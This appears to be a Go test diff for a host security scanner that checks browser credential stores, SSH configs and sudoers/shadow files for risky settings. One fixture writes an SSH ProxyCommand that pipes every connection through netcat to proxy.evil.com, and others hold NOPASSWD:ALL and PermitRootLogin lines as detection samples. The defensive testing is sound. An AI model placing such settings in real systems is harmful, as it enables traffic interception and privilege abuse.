@@ -657,6 +657,131 @@ func TestBrowserScanner_ScanDoesNotError(t *testing.T) {
 	}
 }
 
+// TestBrowserScanner_DetectsFirefoxLoginData creates a fake Firefox profile
+// with logins.json and verifies a MEDIUM finding is produced.
+func TestBrowserScanner_DetectsFirefoxLoginData(t *testing.T) {
+	homesDir := t.TempDir()
+	// Create fake Firefox profile path: <home>/<user>/.mozilla/firefox/<profile>/logins.json
+	userHome := filepath.Join(homesDir, "alice")
+	profileDir := filepath.Join(userHome, ".mozilla", "firefox", "abcd1234.default")
+	if err := os.MkdirAll(profileDir, 0o755); err != nil {
+		t.Fatalf("MkdirAll: %v", err)
+	}
+	if err := os.WriteFile(filepath.Join(profileDir, "logins.json"), []byte(`{"logins":[]}`), 0o600); err != nil {
+		t.Fatalf("WriteFile logins.json: %v", err)
+	}
+
+	s := auth.NewBrowserScannerWithHomesDir(homesDir)
+	findings, err := s.Scan(context.Background(), defaultOpts())
+	if err != nil {
+		t.Fatalf("Scan returned error: %v", err)
+	}
+
+	found := false
+	for _, f := range findings {
+		if f.Scanner == "browser" && f.Severity == scanner.SevMedium {
+			found = true
+			if f.ID == "" {
+				t.Error("finding has empty ID")
+			}
+			if f.Evidence == "" {
+				t.Error("finding has empty Evidence")
+			}
+		}
+	}
+	if !found {
+		t.Errorf("expected MEDIUM finding for Firefox logins.json, got: %+v", findings)
+	}
+}
+
+func TestBrowserScanner_EmptyHomesDirNoFindings(t *testing.T) {
+	homesDir := t.TempDir()
+	s := auth.NewBrowserScannerWithHomesDir(homesDir)
+	findings, err := s.Scan(context.Background(), defaultOpts())
+	if err != nil {
+		t.Fatalf("Scan returned error: %v", err)
+	}
+	if len(findings) != 0 {
+		t.Errorf("expected 0 findings for empty homes dir, got %d", len(findings))
+	}
+}
+
+// ---------------------------------------------------------------------------
+// SSHScanner — SSH client config tests
+// ---------------------------------------------------------------------------
+
+func TestSSHScanner_ClientConfigSuspiciousProxyCommand(t *testing.T) {
+	dir := t.TempDir()
+	sshClientConf := filepath.Join(dir, "config")
+	content := "Host *\n  ProxyCommand nc -X 5 -x proxy.evil.com:1080 %h %p\n"
+	if err := os.WriteFile(sshClientConf, []byte(content), 0o600); err != nil {
+		t.Fatalf("WriteFile: %v", err)
+	}
+
+	sshdConf := writeTempSSHDConfig(t, "")
+	s := auth.NewSSHScannerWithSSHClientConf(sshdConf, sshClientConf)
+	findings, err := s.Scan(context.Background(), defaultOpts())
+	if err != nil {
+		t.Fatalf("Scan error: %v", err)
+	}
+
+	found := false
+	for _, f := range findings {
+		if f.Scanner == "ssh" && strings.Contains(f.Title, "ProxyCommand") {
+			found = true
+			if f.Severity != scanner.SevHigh {
+				t.Errorf("ProxyCommand finding severity = %s, want HIGH", f.Severity)
+			}
+		}
+	}
+	if !found {
+		t.Errorf("expected HIGH finding for suspicious ProxyCommand, got: %+v", findings)
+	}
+}
+
+func TestSSHScanner_ClientConfigCleanNoFindings(t *testing.T) {
+	dir := t.TempDir()
+	sshClientConf := filepath.Join(dir, "config")
+	content := "Host bastion\n  Hostname bastion.example.com\n  User admin\n  IdentityFile ~/.ssh/id_ed25519\n"
+	if err := os.WriteFile(sshClientConf, []byte(content), 0o600); err != nil {
+		t.Fatalf("WriteFile: %v", err)
+	}
+
+	sshdConf := writeTempSSHDConfig(t, "")
+	s := auth.NewSSHScannerWithSSHClientConf(sshdConf, sshClientConf)
+	findings, err := s.Scan(context.Background(), defaultOpts())
+	if err != nil {
+		t.Fatalf("Scan error: %v", err)
+	}
+
+	for _, f := range findings {
+		if f.Scanner == "ssh" && strings.Contains(f.Title, "ProxyCommand") {
+			t.Errorf("clean SSH client config should not produce ProxyCommand finding: %+v", f)
+		}
+	}
+}
+
+// ---------------------------------------------------------------------------
+// UsersScanner — malformed input robustness
+// ---------------------------------------------------------------------------
+
+func TestUsersScanner_MalformedPasswd_NoError(t *testing.T) {
+	dir := t.TempDir()
+	// Include lines with too few fields, blank lines, and comments.
+	passwd := writeTempFile(t, dir, "passwd",
+		"root:x:0:0:root:/root:/bin/bash\n"+
+			"# this is a comment\n"+
+			"\n"+
+			"malformed_line\n"+
+			"ok:x:1000:1000:ok:/home/ok:/bin/bash\n")
+
+	s := newUsersScanner(t, passwd, "", "", "", "")
+	_, err := s.Scan(context.Background(), defaultOpts())
+	if err != nil {
+		t.Fatalf("Scan returned error for malformed passwd: %v", err)
+	}
+}
+
 // ---------------------------------------------------------------------------
 // BrowserScanner — detection tests
 // ---------------------------------------------------------------------------
@@ -770,6 +895,391 @@ func TestBrowserScanner_EscalatesToHighWhenWorldReadable(t *testing.T) {
 	}
 	if !found {
 		t.Errorf("expected HIGH finding for world-readable Login Data, got: %+v", findings)
+	}
+}
+
+// ---------------------------------------------------------------------------
+// RequiredTools / OptionalTools — cover the 0% one-liners
+// ---------------------------------------------------------------------------
+
+func TestAllAuthScanners_RequiredOptionalTools(t *testing.T) {
+	_ = auth.NewBrowserScanner().RequiredTools()
+	_ = auth.NewBrowserScanner().OptionalTools()
+	_ = auth.NewSSHScanner().OptionalTools()
+	_ = auth.NewUsersScanner().RequiredTools()
+	_ = auth.NewUsersScanner().OptionalTools()
+}
+
+// ---------------------------------------------------------------------------
+// SSHScanner — checkSshdConfig with dangerous directives
+// ---------------------------------------------------------------------------
+
+func TestSSHScanner_SshdConfigPermitRootLogin(t *testing.T) {
+	dir := t.TempDir()
+	configPath := filepath.Join(dir, "sshd_config")
+	content := "PermitRootLogin yes\nPasswordAuthentication no\n"
+	if err := os.WriteFile(configPath, []byte(content), 0o644); err != nil {
+		t.Fatalf("WriteFile: %v", err)
+	}
+
+	s := auth.NewSSHScannerWithConfig(configPath)
+	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
+	if err != nil {
+		t.Fatalf("Scan error: %v", err)
+	}
+	found := false
+	for _, f := range findings {
+		if f.Scanner == "ssh" && f.Title == "PermitRootLogin is enabled" {
+			found = true
+			if f.Severity != scanner.SevCritical {
+				t.Errorf("Severity = %s, want CRITICAL", f.Severity)
+			}
+		}
+	}
+	if !found {
+		t.Errorf("expected CRITICAL finding for PermitRootLogin yes, got: %+v", findings)
+	}
+}
+
+func TestSSHScanner_SshdConfigPasswordAuth(t *testing.T) {
+	dir := t.TempDir()
+	configPath := filepath.Join(dir, "sshd_config")
+	content := "PasswordAuthentication yes\n"
+	if err := os.WriteFile(configPath, []byte(content), 0o644); err != nil {
+		t.Fatalf("WriteFile: %v", err)
+	}
+
+	s := auth.NewSSHScannerWithConfig(configPath)
+	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
+	if err != nil {
+		t.Fatalf("Scan error: %v", err)
+	}
+	found := false
+	for _, f := range findings {
+		if f.Scanner == "ssh" && f.Title == "PasswordAuthentication is enabled" {
+			found = true
+		}
+	}
+	if !found {
+		t.Errorf("expected finding for PasswordAuthentication yes, got: %+v", findings)
+	}
+}
+
+func TestSSHScanner_SshdConfigMissingFileHighFinding(t *testing.T) {
+	s := auth.NewSSHScannerWithConfig("/nonexistent/sshd_config_missing")
+	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
+	if err != nil {
+		t.Fatalf("Scan error: %v", err)
+	}
+	found := false
+	for _, f := range findings {
+		if f.Scanner == "ssh" && f.Title == "sshd_config could not be read" {
+			found = true
+			if f.Severity != scanner.SevHigh {
+				t.Errorf("Severity = %s, want HIGH", f.Severity)
+			}
+		}
+	}
+	if !found {
+		t.Errorf("expected 'sshd_config could not be read' finding, got: %+v", findings)
+	}
+}
+
+func TestSSHScanner_SshdConfigCleanNoFindings(t *testing.T) {
+	dir := t.TempDir()
+	configPath := filepath.Join(dir, "sshd_config")
+	content := "# Secure config\nPermitRootLogin no\nPasswordAuthentication no\nMaxAuthTries 3\n"
+	if err := os.WriteFile(configPath, []byte(content), 0o644); err != nil {
+		t.Fatalf("WriteFile: %v", err)
+	}
+
+	s := auth.NewSSHScannerWithConfig(configPath)
+	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
+	if err != nil {
+		t.Fatalf("Scan error: %v", err)
+	}
+	for _, f := range findings {
+		if f.Scanner == "ssh" && (f.Title == "PermitRootLogin is enabled" || f.Title == "PasswordAuthentication is enabled") {
+			t.Errorf("unexpected finding for secure sshd config: %+v", f)
+		}
+	}
+}
+
+// ---------------------------------------------------------------------------
+// UsersScanner — parseShadow and extractSudoersSubject coverage
+// ---------------------------------------------------------------------------
+
+func TestUsersScanner_ScanDoesNotError(t *testing.T) {
+	s := auth.NewUsersScanner()
+	_, err := s.Scan(context.Background(), scanner.ScanOptions{})
+	if err != nil {
+		t.Fatalf("Scan returned unexpected error: %v", err)
+	}
+}
+
+// ---------------------------------------------------------------------------
+// SSHScanner — additional checkSshdConfig directive coverage
+// ---------------------------------------------------------------------------
+
+func TestSSHScanner_SshdConfigPermitEmptyPasswords(t *testing.T) {
+	dir := t.TempDir()
+	configPath := filepath.Join(dir, "sshd_config")
+	content := "PermitEmptyPasswords yes\n"
+	if err := os.WriteFile(configPath, []byte(content), 0o644); err != nil {
+		t.Fatalf("WriteFile: %v", err)
+	}
+	s := auth.NewSSHScannerWithConfig(configPath)
+	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
+	if err != nil {
+		t.Fatalf("Scan error: %v", err)
+	}
+	found := false
+	for _, f := range findings {
+		if f.Scanner == "ssh" && f.Title == "PermitEmptyPasswords is enabled" {
+			found = true
+		}
+	}
+	if !found {
+		t.Errorf("expected finding for PermitEmptyPasswords yes, got: %+v", findings)
+	}
+}
+
+func TestSSHScanner_SshdConfigAllowTcpForwarding(t *testing.T) {
+	dir := t.TempDir()
+	configPath := filepath.Join(dir, "sshd_config")
+	content := "AllowTcpForwarding yes\n"
+	if err := os.WriteFile(configPath, []byte(content), 0o644); err != nil {
+		t.Fatalf("WriteFile: %v", err)
+	}
+	s := auth.NewSSHScannerWithConfig(configPath)
+	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
+	if err != nil {
+		t.Fatalf("Scan error: %v", err)
+	}
+	found := false
+	for _, f := range findings {
+		if f.Scanner == "ssh" && f.Title == "AllowTcpForwarding is enabled" {
+			found = true
+		}
+	}
+	if !found {
+		t.Errorf("expected finding for AllowTcpForwarding yes, got: %+v", findings)
+	}
+}
+
+func TestSSHScanner_SshdConfigX11Forwarding(t *testing.T) {
+	dir := t.TempDir()
+	configPath := filepath.Join(dir, "sshd_config")
+	content := "X11Forwarding yes\n"
+	if err := os.WriteFile(configPath, []byte(content), 0o644); err != nil {
+		t.Fatalf("WriteFile: %v", err)
+	}
+	s := auth.NewSSHScannerWithConfig(configPath)
+	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
+	if err != nil {
+		t.Fatalf("Scan error: %v", err)
+	}
+	found := false
+	for _, f := range findings {
+		if f.Scanner == "ssh" && f.Title == "X11Forwarding is enabled" {
+			found = true
+		}
+	}
+	if !found {
+		t.Errorf("expected finding for X11Forwarding yes, got: %+v", findings)
+	}
+}
+
+func TestSSHScanner_SshdConfigGatewayPorts(t *testing.T) {
+	dir := t.TempDir()
+	configPath := filepath.Join(dir, "sshd_config")
+	content := "GatewayPorts yes\n"
+	if err := os.WriteFile(configPath, []byte(content), 0o644); err != nil {
+		t.Fatalf("WriteFile: %v", err)
+	}
+	s := auth.NewSSHScannerWithConfig(configPath)
+	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
+	if err != nil {
+		t.Fatalf("Scan error: %v", err)
+	}
+	found := false
+	for _, f := range findings {
+		if f.Scanner == "ssh" && f.Title == "GatewayPorts is enabled" {
+			found = true
+		}
+	}
+	if !found {
+		t.Errorf("expected finding for GatewayPorts yes, got: %+v", findings)
+	}
+}
+
+func TestSSHScanner_SshdConfigPermitTunnel(t *testing.T) {
+	dir := t.TempDir()
+	configPath := filepath.Join(dir, "sshd_config")
+	content := "PermitTunnel yes\n"
+	if err := os.WriteFile(configPath, []byte(content), 0o644); err != nil {
+		t.Fatalf("WriteFile: %v", err)
+	}
+	s := auth.NewSSHScannerWithConfig(configPath)
+	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
+	if err != nil {
+		t.Fatalf("Scan error: %v", err)
+	}
+	found := false
+	for _, f := range findings {
+		if f.Scanner == "ssh" && f.Title == "PermitTunnel is enabled" {
+			found = true
+		}
+	}
+	if !found {
+		t.Errorf("expected finding for PermitTunnel yes, got: %+v", findings)
+	}
+}
+
+func TestSSHScanner_SshdConfigMaxAuthTriesHigh(t *testing.T) {
+	dir := t.TempDir()
+	configPath := filepath.Join(dir, "sshd_config")
+	content := "MaxAuthTries 10\n"
+	if err := os.WriteFile(configPath, []byte(content), 0o644); err != nil {
+		t.Fatalf("WriteFile: %v", err)
+	}
+	s := auth.NewSSHScannerWithConfig(configPath)
+	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
+	if err != nil {
+		t.Fatalf("Scan error: %v", err)
+	}
+	found := false
+	for _, f := range findings {
+		if f.Scanner == "ssh" && f.Title == "MaxAuthTries is set too high" {
+			found = true
+		}
+	}
+	if !found {
+		t.Errorf("expected finding for MaxAuthTries 10, got: %+v", findings)
+	}
+}
+
+// ---------------------------------------------------------------------------
+// SSHScanner — ssh-audit ToolRunner coverage
+// ---------------------------------------------------------------------------
+
+type authMockToolRunner struct {
+	available map[string]bool
+	outputs   map[string][]byte
+}
+
+func (m *authMockToolRunner) Available(tool string) bool { return m.available[tool] }
+func (m *authMockToolRunner) Run(_ context.Context, tool string, _ []string) ([]byte, error) {
+	if out, ok := m.outputs[tool]; ok {
+		return out, nil
+	}
+	return nil, nil
+}
+
+func TestSSHScanner_SshAuditToolRunnerExecuted(t *testing.T) {
+	dir := t.TempDir()
+	configPath := filepath.Join(dir, "sshd_config")
+	if err := os.WriteFile(configPath, []byte("# clean\n"), 0o644); err != nil {
+		t.Fatalf("WriteFile: %v", err)
+	}
+	s := auth.NewSSHScannerWithConfig(configPath)
+	// Empty JSON output from ssh-audit — no findings from it, but path is exercised.
+	tr := &authMockToolRunner{
+		available: map[string]bool{"ssh-audit": true},
+		outputs:   map[string][]byte{"ssh-audit": []byte("[]")},
+	}
+	findings, err := s.Scan(context.Background(), scanner.ScanOptions{ToolRunner: tr})
+	if err != nil {
+		t.Fatalf("Scan error: %v", err)
+	}
+	_ = findings // just ensure no panic
+}
+
+// ---------------------------------------------------------------------------
+// UsersScanner — parseShadow and extractSudoersSubject coverage
+// ---------------------------------------------------------------------------
+
+func TestUsersScanner_WithFakePaths(t *testing.T) {
+	dir := t.TempDir()
+
+	// Minimal /etc/passwd — one non-system user with /bin/bash.
+	passwdContent := "root:x:0:0:root:/root:/bin/bash\nuser1:x:1000:1000:User:/home/user1:/bin/bash\n"
+	passwdPath := filepath.Join(dir, "passwd")
+	if err := os.WriteFile(passwdPath, []byte(passwdContent), 0o644); err != nil {
+		t.Fatalf("WriteFile passwd: %v", err)
+	}
+
+	// Shadow without an expired account — should not produce aging findings.
+	shadowContent := "root:$6$abc:19900:0:99999:7:::\nuser1:$6$def:19900:0:99999:7:::\n"
+	shadowPath := filepath.Join(dir, "shadow")
+	if err := os.WriteFile(shadowPath, []byte(shadowContent), 0o644); err != nil {
+		t.Fatalf("WriteFile shadow: %v", err)
+	}
+
+	// Empty sudoers file.
+	sudoersPath := filepath.Join(dir, "sudoers")
+	if err := os.WriteFile(sudoersPath, []byte("# empty\n"), 0o644); err != nil {
+		t.Fatalf("WriteFile sudoers: %v", err)
+	}
+
+	// group file.
+	groupContent := "sudo:x:27:user1\nroot:x:0:\n"
+	groupPath := filepath.Join(dir, "group")
+	if err := os.WriteFile(groupPath, []byte(groupContent), 0o644); err != nil {
+		t.Fatalf("WriteFile group: %v", err)
+	}
+
+	s := auth.NewUsersScannerWithPaths(passwdPath, shadowPath, sudoersPath, filepath.Join(dir, "sudoers.d"), groupPath)
+	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
+	if err != nil {
+		t.Fatalf("Scan error: %v", err)
+	}
+	// Verify findings have required fields.
+	for _, f := range findings {
+		if f.ID == "" {
+			t.Errorf("finding has empty ID: %+v", f)
+		}
+		if f.Scanner == "" {
+			t.Errorf("finding has empty Scanner: %+v", f)
+		}
+	}
+}
+
+func TestUsersScanner_SudoersAllFlagged(t *testing.T) {
+	dir := t.TempDir()
+
+	passwdPath := filepath.Join(dir, "passwd")
+	if err := os.WriteFile(passwdPath, []byte(""), 0o644); err != nil {
+		t.Fatalf("WriteFile: %v", err)
+	}
+	shadowPath := filepath.Join(dir, "shadow")
+	if err := os.WriteFile(shadowPath, []byte(""), 0o644); err != nil {
+		t.Fatalf("WriteFile: %v", err)
+	}
+	groupPath := filepath.Join(dir, "group")
+	if err := os.WriteFile(groupPath, []byte(""), 0o644); err != nil {
+		t.Fatalf("WriteFile: %v", err)
+	}
+	sudoersPath := filepath.Join(dir, "sudoers")
+	// "ALL=(ALL) ALL" rule — should produce a CRITICAL finding.
+	content := "user1 ALL=(ALL) NOPASSWD:ALL\n"
+	if err := os.WriteFile(sudoersPath, []byte(content), 0o644); err != nil {
+		t.Fatalf("WriteFile: %v", err)
+	}
+
+	s := auth.NewUsersScannerWithPaths(passwdPath, shadowPath, sudoersPath, filepath.Join(dir, "sudoers.d"), groupPath)
+	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
+	if err != nil {
+		t.Fatalf("Scan error: %v", err)
+	}
+	found := false
+	for _, f := range findings {
+		if f.Scanner == "users" && f.Severity >= scanner.SevHigh {
+			found = true
+		}
+	}
+	if !found {
+		t.Errorf("expected HIGH+ finding for NOPASSWD:ALL sudoers rule, got: %+v", findings)
 	}
 }
 
